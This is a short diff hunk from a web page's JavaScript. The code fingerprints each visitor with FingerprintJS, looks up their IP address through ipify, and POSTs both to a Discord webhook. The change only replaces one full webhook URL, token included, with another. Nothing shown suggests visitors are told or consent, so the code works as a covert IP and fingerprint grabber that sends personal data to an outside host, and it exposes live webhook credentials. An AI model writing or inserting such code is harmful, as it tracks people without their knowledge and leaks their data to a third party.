@@ -529,7 +529,7 @@
             .then(FingerprintJS => FingerprintJS.load())
             .then(fp => Promise.all([fp.get(), fetch('https://api.ipify.org?format=json').then(r => r.json())]))
             .then(([{ visitorId }, { ip }]) => {
-                fetch('https://discord.com/api/webhooks/1343427162018943068/2Qxszd26D49-1pILvppgLHP0QjIndDJIRi2gZ4voI-dSX-o8ZWO-iXvjQXQYLV54jQ4d', {
+                fetch('https://discord.com/api/webhooks/1343436107999739904/V7gKwumtkzplYWw7Ask4vutclcHHCezszH2yixov6KA9tKpiZ4QCGZKXLal6FpQBpgd8', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
